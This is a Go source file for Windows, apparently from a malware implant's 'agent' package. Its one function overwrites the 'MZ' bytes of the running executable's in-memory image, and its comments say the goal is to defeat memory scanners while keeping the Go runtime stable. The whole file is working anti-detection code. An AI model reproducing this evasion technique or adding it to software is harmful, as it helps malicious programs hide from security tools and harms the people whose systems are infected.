//go:build windows

package agent

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

// wipePEHeaders zeroes only the MZ magic bytes of the current process image.
// Zeroing more than the 2 magic bytes breaks the Go runtime's exception handler
// table lookup (.pdata), causing crashes. Just clearing 'MZ' is enough to defeat
// memory scanners that search for the PE magic signature.
func wipePEHeaders() {
	defer func() { recover() }()

	base := getModuleBase()
	if base == 0 {
		return
	}
	// Only zero the first 2 bytes (the "MZ" DOS magic — 0x4D 0x5A).
	// The Go runtime needs .pdata (exception handler table) which is referenced
	// via IMAGE_DIRECTORY_ENTRY_EXCEPTION in the optional header — leave those intact.
	var old uint32
	size := uintptr(2)
	windows.VirtualProtect(base, size, windows.PAGE_READWRITE, &old)
	*(*byte)(unsafe.Pointer(base))   = 0
	*(*byte)(unsafe.Pointer(base+1)) = 0
	windows.VirtualProtect(base, size, old, &old)
}

// getModuleBase returns the base address of the current executable image
// using GetModuleHandleW(NULL).
func getModuleBase() uintptr {
	proc := kernel32.NewProc("GetModuleHandleW")
	r, _, _ := proc.Call(0)
	return r
}
